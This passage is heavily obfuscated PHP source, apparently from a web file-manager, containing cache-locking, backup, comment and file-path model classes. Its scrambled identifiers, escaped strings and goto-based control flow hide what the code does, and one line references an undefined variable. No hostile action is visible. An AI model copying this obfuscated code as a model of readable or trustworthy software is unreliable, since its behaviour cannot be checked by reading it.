$this->getFile($eïµŞ’¢Ç½); return @unlink($cêÔÖåÑÎ½); } public function deleteAll() { $f Ş¬’’ã… =& $_SERVER[îÖ]; $dê…ù¿§â = scandir($this->cachePath); foreach ($dê…ù¿§â as $a¦âáçÇ‘) { $e×ˆ±ö”…à = $this->cachePath . $a¦âáçÇ‘; if (strpos($e×ˆ±ö”…à, $f Ş¬’’ã…[765]) && strpos($e×ˆ±ö”…à, $f Ş¬’’ã…[766])) { @unlink($e×ˆ±ö”…à); } } } public function clearTimeout() { $c…“Äá–Ü• =& $_SERVER[îÖ]; $A§ËªÖ—óâ = scandir($this->cachePath); foreach ($A§ËªÖ—óâ as $bœÂ´ê¼á) { $e§îÆŞä“Ä = $this->cachePath . $bœÂ´ê¼á; if (strpos($e§îÆŞä“Ä, $c…“Äá–Ü•[765]) && strpos($e§îÆŞä“Ä, $c…“Äá–Ü•[766]) && filemtime($e§îÆŞä“Ä) < time() - $this->cacheTime) { @unlink($e§îÆŞä“Ä); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto F§ºì‡òš; dÊ•°…”­: self::$timeout = $D‹êŸĞ‡¤İ[$cØ‡ĞŠÓÚø[767]] ? $D‹êŸĞ‡¤İ[$cØ‡ĞŠÓÚø[767]] : 10; $D¥§‰ïï‚ = _get($GLOBALS[$cØ‡ĞŠÓÚø[6]], $cØ‡ĞŠÓÚø[768]); $fÕ©ò®ŸÉ = $D‹êŸĞ‡¤İ[$cØ‡ĞŠÓÚø[754]] ? $D‹êŸĞ‡¤İ[$cØ‡ĞŠÓÚø[754]] : $cØ‡ĞŠÓÚø[167]; goto A‰’¢öƒùò; F§ºì‡òš: $cØ‡ĞŠÓÚø =& $_SERVER[îÖ]; if (self::$handle) { return self::$handle; } $D‹êŸĞ‡¤İ = $GLOBALS[$cØ‡ĞŠÓÚø[6]][$cØ‡ĞŠÓÚø[337]]; goto dÊ•°…”­; A‰’¢öƒùò: if ($fÕ©ò®ŸÉ == $cØ‡ĞŠÓÚø[17] && $D¥§‰ïï‚ == $cØ‡ĞŠÓÚø[9]) { $fÕ©ò®ŸÉ = $cØ‡ĞŠÓÚø[167]; } switch ($fÕ©ò®ŸÉ) { case $cØ‡ĞŠÓÚø[757]: self::$handle = new CacheLockRedis(); break; case $cØ‡ĞŠÓÚø[758]: self::$handle = new CacheLockMemcached(); break; case $cØ‡ĞŠÓÚø[17]: self::$handle = new CacheLockDatabase(); break; case $cØ‡ĞŠÓÚø[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto A¤ÇĞÓÄÊ¿; A¤ÇĞÓÄÊ¿: } private static function key($d®ŞßÁˆ—) { return $_SERVER[îÖ][769] . Cache::key($d®ŞßÁˆ—); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($C¥Õƒåè‘Ş = '') { self::$errorMsg = $C¥Õƒåè‘Ş; } public static function lockGlobal($dàŒñùùÛœ, $e“øãÆ©é) { return self::lock($dàŒñùùÛœ, $e“øãÆ©é, !0); } public static function lock($fŠ§ß¥‚›Ê, $FîÛ‚ÊĞè = false, $DÂ¸èÙï©â = false) { goto AŒíï¤‚¿Ã; fƒªØÈñç: if (!$DÂ¸èÙï©â) { self::$lockItem[$DõÖ¸¸ñÎ‡] = !0; } return $cÀäöÀ¼›; goto c§ìÉÃ¯ÉÉ; AŒíï¤‚¿Ã: $EÄÑ‰ŠíªÛ =& $_SERVER[îÖ]; $d»ãÀØíÔ = self::init(); $DõÖ¸¸ñÎ‡ = self::key($fŠ§ß¥‚›Ê); goto c«‰§ä¾µ; c«‰§ä¾µ: $FîÛ‚ÊĞè = $FîÛ‚ÊĞè ? $FîÛ‚ÊĞè : self::$timeout; $cÀäöÀ¼› = $d»ãÀØíÔ->lock($DõÖ¸¸ñÎ‡, $FîÛ‚ÊĞè); if (!$cÀäöÀ¼›) { $eÖ½¦ÀÈã‚ = $EÄÑ‰ŠíªÛ[770] . $FîÛ‚ÊĞè . $EÄÑ‰ŠíªÛ[67] . self::$errorMsg . $EÄÑ‰ŠíªÛ[67] . get_caller_msg(); $E²É×Î„§ó = "\x4c\157\x63\153\x20\141\x63\164\151\x6f\x6e\x3a\x20{$DõÖ¸¸ñÎ‡}\x20\164\151\x6d\x65\157\165\x74\54\x6f\166\x65\162\40{$FîÛ‚ÊĞè}\x20\163"; $E²É×Î„§ó = self::$errorMsg ? self::$errorMsg : $FÕ»È¯‘ì‚; write_log($eÖ½¦ÀÈã‚, $EÄÑ‰ŠíªÛ[771]); show_json($E²É×Î„§ó, !1); } goto fƒªØÈñç; c§ìÉÃ¯ÉÉ: } public static function lockGet($BµÃƒäŠë) { $eÖê‘Ëóì = self::key($BµÃƒäŠë); if (self::$lockItem[$eÖê‘Ëóì]) { return self::$lockItem[$eÖê‘Ëóì]; } return self::init()->lockGet($eÖê‘Ëóì); } public static function unlock($Cé¡ñ¬‚) { $d†¹½–‰´ = self::key($Cé¡ñ¬‚); self::$lockItem[$d†¹½–‰´] = null; return self::init()->unlock($d†¹½–‰´); } public static function unlockRuntime() { $bß¦Ñ÷‹© =& $_SERVER[îÖ]; $a¥ Şš¬À = self::init(); $e§å»³ãì = !1; foreach (self::$lockItem as $bİòÎ‡•´˜ => $C¬ãĞÍ¹åÏ) { if (!$C¬ãĞÍ¹åÏ) { continue; } $a¥ Şš¬À->unlock($bİòÎ‡•´˜); if (!$e§å»³ãì) { $e§å»³ãì = !0; write_log($bß¦Ñ÷‹©[772] . $bİòÎ‡•´˜ . $bß¦Ñ÷‹©[67] . get_caller_msg(), $bß¦Ñ÷‹©[771]); continue; } write_log($bß¦Ñ÷‹©[772] . $bİòÎ‡•´˜, $bß¦Ñ÷‹©[771]); } } } goto EÛ¿èŒïÌ¨; C¥ôöİ‡¾Ö: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\142\x61\143\x6b\x75\x70\114\151\163\164"; public $field = array("\151\x6f", "\156\x61\155\x65", "\163\x74\141\164\165\163", "\143\x6f\156\164\145\x6e\x74", "\162\145\x73\165\154\164", "\164\x69\155\x65\x46\162\x6f\x6d", "\164\151\x6d\x65\x54\x6f"); public function config() { goto bÃ¤¥†Â¶Ø; bÃ¤¥†Â¶Ø: $a“”ôÚŠÃË =& $_SERVER[îÖ]; $eĞóÄ£šê = Model($a“”ôÚŠÃË[1082])->get($a“”ôÚŠÃË[713]); $eĞóÄ£šê = json_decode($eĞóÄ£šê, !0); goto A—âÙŠˆ¢; c£®ó£Ôõò: Action($a“”ôÚŠÃË[2121])->taskInit(); $d©ùêĞß“® = Model($a“”ôÚŠÃË[2122])->listData(); foreach ($d©ùêĞß“® as $a¾·¨‚è£) { if ($a¾·¨‚è£[$a“”ôÚŠÃË[1074]] == $a“”ôÚŠÃË[83] && $a¾·¨‚è£[$a“”ôÚŠÃË[1419]] == $a“”ôÚŠÃË[2123]) { $dâ‚½×À¹ = $a¾·¨‚è£; break; } } goto e‚‰±‡©ËÌ; A—âÙŠˆ¢: $eĞóÄ£šê = is_array($eĞóÄ£šê) ? $eĞóÄ£šê : array(); if (!isset($eĞóÄ£šê[$a“”ôÚŠÃË[691]])) { $eĞóÄ£šê[$a“”ôÚŠÃË[691]] = $a“”ôÚŠÃË[468]; } $dâ‚½×À¹ = array(); goto c£®ó£Ôõò; e‚‰±‡©ËÌ: if (isset($dâ‚½×À¹[$a“”ôÚŠÃË[190]])) { $dâ‚½×À¹[$a“”ôÚŠÃË[190]] = json_decode($dâ‚½×À¹[$a“”ôÚŠÃË[190]], !0); } if (isset($eĞóÄ£šê[$a“”ôÚŠÃË[190]])) { $dâ‚½×À¹[$a“”ôÚŠÃË[190]][$a“”ôÚŠÃË[1406]] = $eĞóÄ£šê[$a“”ôÚŠÃË[190]]; unset($eĞóÄ£šê[$a“”ôÚŠÃË[190]]); } return array_merge($dâ‚½×À¹, $eĞóÄ£šê); goto e†İ¹²’»ã; e†İ¹²’»ã: } public function listData($C‰Í›‘øÖ = false, $e¸ÇÚ¢‹†‰ = "\x6d\x6f\x64\x69\x66\171\124\151\155\x65", $Aö™ø¨àâ = false) { return parent::listData($C‰Í›‘øÖ, $e¸ÇÚ¢‹†‰, !0); } public function lastItem() { $bï«ÀØµ—Æ = $this->listData(); return !empty($bï«ÀØµ—Æ[0]) ? $bï«ÀØµ—Æ[0] : null; } public function kill($cšàÜñ˜‘¹) { goto a¸Â¡¹Õ”; a¸Â¡¹Õ”: $b·éêÅñà =& $_SERVER[îÖ]; $b¼Œš†Ï¤ = $this->listData($cšàÜñ˜‘¹); if (!$b¼Œš†Ï¤ || empty($b¼Œš†Ï¤[$b·éêÅñà[28]])) { return !0; } goto cóùÌ†ê£; cæ»‡²­Š¶: $c‘¿ŸòÆâÄ = $b¼Œš†Ï¤[$b·éêÅñà[28]]; $C¼°‹™œŞ = TEMP_FILES . $b·éêÅñà[709] . $c‘¿ŸòÆâÄ . $b·éêÅñà[8]; IO::remove($C¼°‹™œŞ, !1); goto e¿Ä¿µ¦¯¦; e¿Ä¿µ¦¯¦: return $this->remove($cšàÜñ˜‘¹); goto aç²¢¨·Ù; cóùÌ†ê£: Task::kill($b·éêÅñà[712]); Task::kill($b·éêÅñà[728]); Task::kill($b·éêÅñà[736]); goto cæ»‡²­Š¶; aç²¢¨·Ù: } public function remove($cåæ¡ªŞø) { $cõËĞÏåÊã = $this->listData($cåæ¡ªŞø); if (!$cõËĞÏåÊã) { return !0; } return $this->backupRemove($cõËĞÏåÊã); } private function backupRemove($D÷È„Î±¬) { $D¸“Ãöñº¡ =& $_SERVER[îÖ]; parent::remove($D÷È„Î±¬[$D¸“Ãöñº¡[367]]); $eªÒø¡–©Ë = "\173\151\x6f\72{$D÷È„Î±¬[$D¸“Ãöñº¡[690]]}\175\57\144\141\164\141\142\x61\x73\x65\57\x62\141\143\x6b\165\160\137" . $D÷È„Î±¬[$D¸“Ãöñº¡[28]]; IO::remove($eªÒø¡–©Ë, !1); return !0; } public function start() { goto B¥Ï—‚™«; B¥Ï—‚™«: $E–Àİƒ‹­ =& $_SERVER[îÖ]; if ($GLOBALS[$E–Àİƒ‹­[6]][$E–Àİƒ‹­[84]][$E–Àİƒ‹­[2124]] != $E–Àİƒ‹­[83]) { return !0; } $Fõ¤ÄõÎĞÔ = $this->config(); goto cØ­×–ÎÌ¯; CšîëÅÙàé: if (!$Cˆ¾¥¿‘§¬->dbFile()) { return !1; } if ($Fõ¤ÄõÎĞÔ[$E–Àİƒ‹­[691]] == $E–Àİƒ‹­[468]) { $Cˆ¾¥¿‘§¬->file(); } Backup::set(array($E–Àİƒ‹­[688] => 1, $E–Àİƒ‹­[702] => time())); goto bÆÇ½²Àä²; cØ­×–ÎÌ¯: if (!$Fõ¤ÄõÎĞÔ || $Fõ¤ÄõÎĞÔ[$E–Àİƒ‹­[1403]] != $E–Àİƒ‹­[83]) { return !1; } $BÔ¡ÒËÁ¹ = $this->process(); foreach ($BÔ¡ÒËÁ¹ as $dÙôä®À¼) { if ($dÙôä®À¼) { return Task::restart($dÙôä®À¼[$E–Àİƒ‹­[367]]); } } goto bÌ…Ÿ‰³µá; bÌ…Ÿ‰³µá: $Cˆ¾¥¿‘§¬ = new Backup(); $Cˆ¾¥¿‘§¬->keep(); if (!$Cˆ¾¥¿‘§¬->db()) { return !1; } goto CšîëÅÙàé; bÆÇ½²Àä²: return !0; goto FÇ¨á•¡¦; FÇ¨á•¡¦: } public function process() { $DŠ‘í›ÈÒõ =& $_SERVER[îÖ]; return array($DŠ‘í›ÈÒõ[693] => Task::get($DŠ‘í›ÈÒõ[712]), $DŠ‘í›ÈÒõ[696] => Task::get($DŠ‘í›ÈÒõ[728]), $DŠ‘í›ÈÒõ[167] => Task::get($DŠ‘í›ÈÒõ[736])); } public function restore() { $aöœÁÁ„”ó =& $_SERVER[îÖ]; ActionCall($aöœÁÁ„”ó[2125], !0, 1); ActionCall($aöœÁÁ„”ó[2125], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\156\x74"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\x61\155\145" => "\x63\157\155\155\145\156\164\137\155\x65\x74\x61", "\155\x65\x74\141\106\151\145\x6c\144" => "\x63\x6f\x6d\x6d\x65\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Bİ½µ¤öñ¿) { $B’ª…‰óËç =& $_SERVER[îÖ]; if ($Bİ½µ¤öñ¿[$B’ª…‰óËç[2126]]) { $cÓ¸Œˆ¾«» = $this->where(array($B’ª…‰óËç[2127] => $Bİ½µ¤öñ¿[$B’ª…‰óËç[2126]]))->find(); if (!$cÓ¸Œˆ¾«» || $cÓ¸Œˆ¾«»[$B’ª…‰óËç[371]] != $Bİ½µ¤öñ¿[$B’ª…‰óËç[371]] || $cÓ¸Œˆ¾«»[$B’ª…‰óËç[456]] != $Bİ½µ¤öñ¿[$B’ª…‰óËç[456]]) { return !1; } $this->where(array($B’ª…‰óËç[2127] => $Bİ½µ¤öñ¿[$B’ª…‰óËç[2126]]))->setAdd($B’ª…‰óËç[2128], 1); } return $this->add($Bİ½µ¤öñ¿); } public function remove($B¨õéŞİÂ) { $Fİ¢’‡”ğ³ =& $_SERVER[îÖ]; $C¼ğ‘»×÷È = array($Fİ¢’‡”ğ³[2127] => $B¨õéŞİÂ); $d‚ÑÊ²Åæ‚ = $this->where($C¼ğ‘»×÷È)->find(); if ($d‚ÑÊ²Åæ‚[$Fİ¢’‡”ğ³[2126]]) { $this->where(array($Fİ¢’‡”ğ³[2127] => $d‚ÑÊ²Åæ‚[$Fİ¢’‡”ğ³[2126]]))->setAdd($Fİ¢’‡”ğ³[2128], -1); } return $this->where($C¼ğ‘»×÷È)->delete(); } public function edit($b´õåŒ‡«´, $e¦«Õéš«) { $f¢¦‰¤ëç– =& $_SERVER[îÖ]; $D‚ºâÈ”ƒ¹ = array($f¢¦‰¤ëç–[2127] => $b´õåŒ‡«´); return $this->where($D‚ºâÈ”ƒ¹)->save(array($f¢¦‰¤ëç–[2129] => $e¦«Õéš«)); } public function prasise($EŒ¶ÈŒ”·ô) { $eÁéÏÕÌ =& $_SERVER[îÖ]; $CñŒ°ËŸ† = Model($eÁéÏÕÌ[2130]); $e”„Î˜ÓØ = array($eÁéÏÕÌ[2127] => $EŒ¶ÈŒ”·ô, $eÁéÏÕÌ[1422] => USER_ID); $CÒ‹·ÀÔ©Â = $CñŒ°ËŸ†->where($e”„Î˜ÓØ)->find(); if (!$CÒ‹·ÀÔ©Â) { $CñŒ°ËŸ†->add($e”„Î˜ÓØ); $C¥§÷ ÁÜ = $this->where(array($eÁéÏÕÌ[2127] => $EŒ¶ÈŒ”·ô))->setAdd($eÁéÏÕÌ[2131], 1); } else { $CñŒ°ËŸ†->where($e”„Î˜ÓØ)->delete(); $C¥§÷ ÁÜ = $this->where(array($eÁéÏÕÌ[2127] => $EŒ¶ÈŒ”·ô))->setAdd($eÁéÏÕÌ[2131], -1); } return $C¥§÷ ÁÜ; } public function targetInfo($EéÔˆ¢Å©, $C´“´çè—) { goto aÂÌËì…ó; cç”±·í¾: return $fğÚØÒ©¹ß; goto F™‡±³ğô; a´êÃè»¾°: $cèì²µï¦„ = "\122\x49\x47\110\124\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\x63\157\x6d\x6d\145\x6e\x74\x5f\160\162\x61\151\x73\145\x20\x73\x74\141\x72\40\x6f\156\40\x63\157\155\155\145\156\x74\x2e\143\x6f\x6d\x6d\145\156\x74\111\x44\x20\x3d\x20\x73\164\x61\162\56\143\x6f\x6d\x6d\x65\156\x74\111\x44"; $AÑ©Ê‹àÂ… = $this->alias($a›ºÒÉ…Õ†[341])->where($F›ÛŸ¦ËÖ…)->join($cèì²µï¦„, $a›ºÒÉ…Õ†[2132])->count(); $fğÚØÒ©¹ß = array($a›ºÒÉ…Õ†[2133] => $DšÆÁŒÛ¶›, $a›ºÒÉ…Õ†[2134] => $AÑ©Ê‹àÂ…); goto cç”±·í¾; aÂÌËì…ó: $a›ºÒÉ…Õ† =& $_SERVER[îÖ]; $F›ÛŸ¦ËÖ… = array($a›ºÒÉ…Õ†[521] => $EéÔˆ¢Å©, $a›ºÒÉ…Õ†[522] => $C´“´çè—); $DšÆÁŒÛ¶› = $this->where($F›ÛŸ¦ËÖ…)->count(); goto a´êÃè»¾°; F™‡±³ğô: } public function listData($C…‘Â¹ Úå) { $CêŸ˜Åó‘ =& $_SERVER[îÖ]; if (isset($C…‘Â¹ Úå[$CêŸ˜Åó‘[2135]])) { if ($C…‘Â¹ Úå[$CêŸ˜Åó‘[2135]]) { $C…‘Â¹ Úå[$CêŸ˜Åó‘[2136]] = array($CêŸ˜Åó‘[922], intval($C…‘Â¹ Úå[$CêŸ˜Åó‘[2135]])); } unset($C…‘Â¹ Úå[$CêŸ˜Åó‘[2135]]); } if (isset($C…‘Â¹ Úå[$CêŸ˜Åó‘[2137]])) { if ($C…‘Â¹ Úå[$CêŸ˜Åó‘[2137]]) { $C…‘Â¹ Úå[$CêŸ˜Åó‘[2136]] = array($CêŸ˜Åó‘[919], intval($C…‘Â¹ Úå[$CêŸ˜Åó‘[2137]])); } unset($C…‘Â¹ Úå[$CêŸ˜Åó‘[2137]]); } return $this->_listData($C…‘Â¹ Úå); } private function _listData($FåÕñøŠÈâ) { $Bë¦¡Á¼ =& $_SERVER[îÖ]; $f©åÇ˜¹°Ô = $this->where($FåÕñøŠÈâ)->_makeOrder()->selectPage(100); $this->_listAppendParent($f©åÇ˜¹°Ô[$Bë¦¡Á¼[354]]); $this->_listAppendUser($f©åÇ˜¹°Ô[$Bë¦¡Á¼[354]]); $this->_listAppendMeta($f©åÇ˜¹°Ô[$Bë¦¡Á¼[354]]); return $f©åÇ˜¹°Ô; } private function _makeOrder() { $D„¾Ğ¨Ä”° =& $_SERVER[îÖ]; $E¨áÑ‘åñÈ = array($D„¾Ğ¨Ä”°[2131], $D„¾Ğ¨Ä”°[2128], $D„¾Ğ¨Ä”°[187]); $bÎ’²É = Input::get($D„¾Ğ¨Ä”°[407], $D„¾Ğ¨Ä”°[7], $D„¾Ğ¨Ä”°[389], $E¨áÑ‘åñÈ); $cÍ×à¸¾Ñ… = Input::get($D„¾Ğ¨Ä”°[408], $D„¾Ğ¨Ä”°[7], $D„¾Ğ¨Ä”°[1424], array($D„¾Ğ¨Ä”°[2138], $D„¾Ğ¨Ä”°[405])); $fŠ•ÖâÏÌ” = $bÎ’²É . $D„¾Ğ¨Ä”°[50] . $cÍ×à¸¾Ñ…; return $this->order($fŠ•ÖâÏÌ”); } private function _listAppendParent(&$b³‹ÒÀ²÷£) { goto a©òá½È¥; eÖë´ Š¹Õ: foreach ($b³‹ÒÀ²÷£ as &$eøÄ¾»Â‹) { if (isset($CŸ‰ £ƒ²ß[$eøÄ¾»Â‹[$E¿„Òøâ[2126]]])) { $eøÄ¾»Â‹[$E¿„Òøâ[2139]] = $CŸ‰ £ƒ²ß[$eøÄ¾»Â‹[$E¿„Òøâ[2126]]]; } } goto f¿§éîÏ“; a©òá½È¥: $E¿„Òøâ =& $_SERVER[îÖ]; $D›¯Ë«ò¹à = array_unique(array_to_keyvalue($b³‹ÒÀ²÷£, $E¿„Òøâ[33], $E¿„Òøâ[2126])); $D›¯Ë«ò¹à = array_remove_value($D›¯Ë«ò¹à, $E¿„Òøâ[468]); goto C‹¦­ÒÙ›‹; C‹¦­ÒÙ›‹: if (!$D›¯Ë«ò¹à) { return; } $CŸ‰ £ƒ²ß = $this->where(array($E¿„Òøâ[2127] => array($E¿„Òøâ[7], $D›¯Ë«ò¹à)))->select(); $CŸ‰ £ƒ²ß = array_to_keyvalue($CŸ‰ £ƒ²ß, $E¿„Òøâ[2136]); goto eÖë´ Š¹Õ; f¿§éîÏ“: } private function _listAppendUser(&$E°òÓéÙù) { goto d¤Ù‡˜¶¯µ; E×Å”íÓ‚¢: foreach ($E°òÓéÙù as &$BÚÈë‚§) { $BÚÈë‚§[$AÆâœ’ˆŞ[535]] = $bÓ²­ÉäÕä[$BÚÈë‚§[$AÆâœ’ˆŞ[1431]]]; if (isset($BÚÈë‚§[$AÆâœ’ˆŞ[2139]])) { $BÚÈë‚§[$AÆâœ’ˆŞ[2139]][$AÆâœ’ˆŞ[535]] = $bÓ²­ÉäÕä[$BÚÈë‚§[$AÆâœ’ˆŞ[2139]][$AÆâœ’ˆŞ[1431]]]; } } goto d×ÖÂìñå²; d¤Ù‡˜¶¯µ: $AÆâœ’ˆŞ =& $_SERVER[îÖ]; $e¥ »ŞŠ²¨ = array_unique(array_to_keyvalue($E°òÓéÙù, $AÆâœ’ˆŞ[33], $AÆâœ’ˆŞ[1431])); $e¥ »ŞŠ²¨ = array_remove_value($e¥ »ŞŠ²¨, $AÆâœ’ˆŞ[468]); goto cñÊŠš‹ë‰; cñÊŠš‹ë‰: if (count($e¥ »ŞŠ²¨) == 0) { return; } foreach ($E°òÓéÙù as $BÚÈë‚§) { if (isset($BÚÈë‚§[$AÆâœ’ˆŞ[2139]])) { $e¥ »ŞŠ²¨[] = $BÚÈë‚§[$AÆâœ’ˆŞ[2139]][$AÆâœ’ˆŞ[1431]]; } } $bÓ²­ÉäÕä = Model($AÆâœ’ˆŞ[477])->userListInfo($e¥ »ŞŠ²¨); goto E×Å”íÓ‚¢; d×ÖÂìñå²: } private function _listAppendMeta(&$D»ï°™Á³) { goto dì»×è¢‰ê; fä· ¶…¯: if (!$c‹Ä‘¸‘í) { return !1; } foreach ($D»ï°™Á³ as &$F¹÷†÷Éç) { $F¹÷†÷Éç[$Dôºº¥Éôˆ[417]] = $c‹Ä‘¸‘í[$F¹÷†÷Éç[$Dôºº¥Éôˆ[2136]]]; if (isset($F¹÷†÷Éç[$Dôºº¥Éôˆ[2139]])) { $F¹÷†÷Éç[$Dôºº¥Éôˆ[2139]][$Dôºº¥Éôˆ[417]] = $c‹Ä‘¸‘í[$F¹÷†÷Éç[$Dôºº¥Éôˆ[2139]][$Dôºº¥Éôˆ[2136]]]; } } goto F¤ñº¢äÅº; dì»×è¢‰ê: $Dôºº¥Éôˆ =& $_SERVER[îÖ]; $Aˆ„â‰¸äê = array_unique(array_to_keyvalue($D»ï°™Á³, $Dôºº¥Éôˆ[33], $Dôºº¥Éôˆ[2136])); $Aˆ„â‰¸äê = array_remove_value($Aˆ„â‰¸äê, $Dôºº¥Éôˆ[468]); goto F°ÚÃŠ»Ç; F°ÚÃŠ»Ç: if (!$Aˆ„â‰¸äê) { return; } foreach ($D»ï°™Á³ as $F¹÷†÷Éç) { if (isset($F¹÷†÷Éç[$Dôºº¥Éôˆ[2139]])) { $Aˆ„â‰¸äê[] = $F¹÷†÷Éç[$Dôºº¥Éôˆ[2139]][$Dôºº¥Éôˆ[2136]]; } } $c‹Ä‘¸‘í = $this->metaList($Aˆ„â‰¸äê); goto fä· ¶…¯; F¤ñº¢äÅº: } private function metaList($eˆä²ğÇ’) { goto EÑ‚¦ÁÕ; EÑ‚¦ÁÕ: $Bá£ÏÛ´Ø° =& $_SERVER[îÖ]; if (!$eˆä²ğÇ’) { return array(); } $b…ãŞ§•¡ì = array($Bá£ÏÛ´Ø°[2136] => array($Bá£ÏÛ´Ø°[7], $eˆä²ğÇ’)); goto c¤ìáÜÚá¹; cÄ“¤Ö›½Ü: return $bÈÊä“¹Û¦ ? $bÈÊä“¹Û¦ : array(); goto eùè £øŸ¶; c¤ìáÜÚá¹: $bÈÊä“¹Û¦ = Model($Bá£ÏÛ´Ø°[2140])->where($b…ãŞ§•¡ì)->select(); $bÈÊä“¹Û¦ = array_to_keyvalue_group($bÈÊä“¹Û¦, $Bá£ÏÛ´Ø°[2136]); foreach ($bÈÊä“¹Û¦ as $E¡øäåˆõó => $bŸˆ•¿´‹) { $Bâ÷½“à•µ = array(); foreach ($bŸˆ•¿´‹ as $A«òù±£Ë™) { $Bâ÷½“à•µ[$A«òù±£Ë™[$Bá£ÏÛ´Ø°[89]]] = $A«òù±£Ë™[$Bá£ÏÛ´Ø°[359]]; } $bÈÊä“¹Û¦[$E¡øäåˆõó] = $Bâ÷½“à•µ; } goto cÄ“¤Ö›½Ü; eùè £øŸ¶: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\x6c\145"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\155\x65" => "\x69\x6f\x5f\x66\x69\154\x65\x5f\x6d\x65\x74\141", "\x6d\145\x74\141\106\151\x65\154\x64" => "\x66\x69\154\145\111\104"); public function fileInfo($aÅä„°ê‘) { $CõùÂŒ–î¢ =& $_SERVER[îÖ]; static $b¯Õ…é¥¢ = array(); if (!isset($b¯Õ…é¥¢[$aÅä„°ê‘])) { $Bœ”ô‰¬Œ“ = $CõùÂŒ–î¢[2141]; $Dµõøï¼à¶ = Model($CõùÂŒ–î¢[422])->field($Bœ”ô‰¬Œ“)->where(array($CõùÂŒ–î¢[420] => $aÅä„°ê‘))->find(); $b¯Õ…é¥¢[$aÅä„°ê‘] = $Dµõøï¼à¶; } return $b¯Õ…é¥¢[$aÅä„°ê‘]; } public function addFileByContent($eÀ½‘ºï¿ = '', $aŠ¦Ô±‹Ò‹ = '') { goto E™ˆœ«Š—; D¸¢¤ÚÂğ»: $A¼áËŸŒÛ— = $D¥÷Äò…›² . $e—Ôùë¦æ‘[2143] . rand_string(16); file_put_contents($A¼áËŸŒÛ—, $eÀ½‘ºï¿); $E¨Õ˜‹°Ï´ = $this->addFile($A¼áËŸŒÛ—, $aŠ¦Ô±‹Ò‹, !0); goto A—ÜêÊ‹ ; E™ˆœ«Š—: $e—Ôùë¦æ‘ =& $_SERVER[îÖ]; $D¥÷Äò…›² = TEMP_PATH . $e—Ôùë¦æ‘[2142]; if (!is_dir($D¥÷Äò…›²)) { mk_dir($D¥÷Äò…›²); } goto D¸¢¤ÚÂğ»; A—ÜêÊ‹ : if (file_exists($A¼áËŸŒÛ—)) { @unlink($A¼áËŸŒÛ—); } return $E¨Õ˜‹°Ï´; goto dÔÆ®íĞÃ; dÔÆ®íĞÃ: } public function createFileName($bÎ¹Œ‚½ãî) { goto e¯ÌÅä”“; BïÜï‹·ßä: $e–†Ìå = $b¬ÅË™ˆ‚ê->pathFather($e‡±‡×©Ö); static $DöÁ½§×é‘ = false; $dİ‚ÓÖÙ×Ë = $fÑÇÒ¸˜»[2144] . md5($e–†Ìå); goto Eí¿ô‹éœÇ; Eí¿ô‹éœÇ: if (!$DöÁ½§×é‘ && !Cache::get($dİ‚ÓÖÙ×Ë)) { $DöÁ½§×é‘ = !0; $AÙÅ˜¬† ¦ = IO::mkdir($e–†Ìå); if (!IO::exist($AÙÅ˜¬† ¦ . $fÑÇÒ¸˜»[2145])) { IO::mkfile($AÙÅ˜¬† ¦ . $fÑÇÒ¸˜»[2145]); } Cache::set($dİ‚ÓÖÙ×Ë, 1, 3600 * 2); } return $e‡±‡×©Ö; goto c¼óØÈò‰ì; e¯ÌÅä”“: $fÑÇÒ¸˜» =& $_SERVER[îÖ]; $b¬ÅË™ˆ‚ê = IO::init($fÑÇÒ¸˜»[8]); $e‡±‡×©Ö = $this->makeFilePath($bÎ¹Œ‚½ãî, $b¬ÅË™ˆ‚ê); goto BïÜï‹·ßä; c¼óØÈò‰ì: } public function makeFilePath($B¹Ğ³©Ó†°, $FÁ×µ±äİÅ) { goto A«¼½çŠí»; cÎšÓÒÄ¿š: $Aî­ÙõÀë¿ = $b‚œœ¯Î£‘ . rand_string(5) . short_id(100); $B¹Ğ³©Ó†° = str_replace($A…ŸÓÜ‹„[8], $A…ŸÓÜ‹„[70], KodIO::clear($B¹Ğ³©Ó†°)); if (!$B¹Ğ³©Ó†°) { $a•›„…Æš´ = $A…ŸÓÜ‹„[2148]; } goto FÅ¬Ì´äÊ¤; FÅ¬Ì´äÊ¤: switch ($a•›„…Æš´) { case $A…ŸÓÜ‹„[2149]: $Aî­ÙõÀë¿ = $Aî­ÙõÀë¿ . $A…ŸÓÜ‹„[91] . $FÁ×µ±äİÅ->ext($B¹Ğ³©Ó†°); if ($FÁ×µ±äİÅ->ext($B¹Ğ³©Ó†°) == $A…ŸÓÜ‹„[2089]) { $Aî­ÙõÀë¿ .= $A…ŸÓÜ‹„[2150]; } break; case $A…ŸÓÜ‹„[2151]: goto eœŒ„áäêŒ; eœŒ„áäêŒ: $AÂ¶‡Í¤½ = Model($A…ŸÓÜ‹„[1082])->get($A…ŸÓÜ‹„[1330]); $b÷ˆó¦¨óÍ = substr(md5($A…ŸÓÜ‹„[1908] . $AÂ¶‡Í¤½ . date($A…ŸÓÜ‹„[686])), 0, 8); $b‚œœ¯Î£‘ = KodIO::defaultIO() . date($A…ŸÓÜ‹„[2152]) . $b÷ˆó¦¨óÍ . $A…ŸÓÜ‹„[8]; goto Bå¼·‡Ë¼Á; E„è¯â¶: break; goto CŞòÀ•£Ñ‘; Bå¼·‡Ë¼Á: if ($FÁ×µ±äİÅ->ext($B¹Ğ³©Ó†°) == $A…ŸÓÜ‹„[2089]) { $B¹Ğ³©Ó†° .= $A…ŸÓÜ‹„[2150]; } $AÇœòçŒÂµ = IO::fileNameAuto($b‚œœ¯Î£‘, $B¹Ğ³©Ó†°); $Aî­ÙõÀë¿ = $b‚œœ¯Î£‘ . $AÇœòçŒÂµ; goto E„è¯â¶; CŞòÀ•£Ñ‘: case $A…ŸÓÜ‹„[2148]: break; default: break; } return 